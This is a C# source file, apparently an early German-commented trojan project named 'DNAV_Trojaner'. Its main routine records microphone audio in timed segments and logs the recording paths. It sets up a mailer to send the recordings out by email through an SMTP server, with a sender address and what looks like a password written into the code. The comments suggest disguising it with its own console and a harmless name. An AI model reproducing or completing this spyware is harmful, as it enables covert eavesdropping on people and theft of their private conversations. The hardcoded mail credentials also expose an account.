using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;

namespace DNAV_Trojaner {
    class Program {
        static public void tonaufnahme() {
        //! Beispieleinbindungen 
        //? Am besten trz eigene Console samt guten Name.  
            //! ini   
            Mailer m = new Mailer("dnav@gmx.com"); //? Selber Email senden
            string log = @"log.txt";
            File.Delete(log);
            System.Threading.Thread.Sleep(100);
            int sec = 10;

        //! Einbindungsmöglichkeit 1
            //? Selber Start-Stop
            Audio aufnahme01 = new Audio(@"test01");
            aufnahme01.start();
            System.Threading.Thread.Sleep(sec * 1000);
            aufnahme01.stop();

        //! Einbindungsmöglichkeit 2
            //? Start mit auto Stop
            Audio aufnahme02 = new Audio(@"test02");
            aufnahme02.start(sec);

            //! Nur auf Ende warten..
            System.Threading.Thread.Sleep(sec * 1000);

        //! Einbindungsmöglichkeit 3
            //? Start mit Loop und Funktion
            Audio aufnahme03 = new Audio(@"test03");
            Audio.Execution func = (path) => {
                //? An dieser Stelle wäre speichern/senden 
                //TODO: Funktioniert noch nicht: m.send("Neue Datei", "Eine neue Datei verfügbat:", path);
                StreamWriter sw = new StreamWriter(log, true, Encoding.ASCII);
                sw.Write(path+"\n");
                sw.Close();
            };
            aufnahme03.start(sec, func);
        //! Läuft nun bis Beendung.     
            //! Abbruch Via 
            aufnahme03.stop();
            //! Nur in einem anderen Thread möglich
        }

    //! Beispieleinbindungen
        public void sendMail(){
            Mailer A = new Mailer("tempTo@mail.de");
            Mailer B = new Mailer("tempTo@mail.de","dnav@gmx.com","DNAV@gmx.de","MiauMiau",465,"mail.gmx.com");
            A.send("Betreff/Neue Datei", "Inhalt/Eine neue Datei verfügbat:", @"path");
            B.send("Betreff","Inhalt");
        }
        static void Main(string[] args) {
            //TODO: Funktioniert noch nicht: sendMail();
            tonaufnahme();
        }
    }
}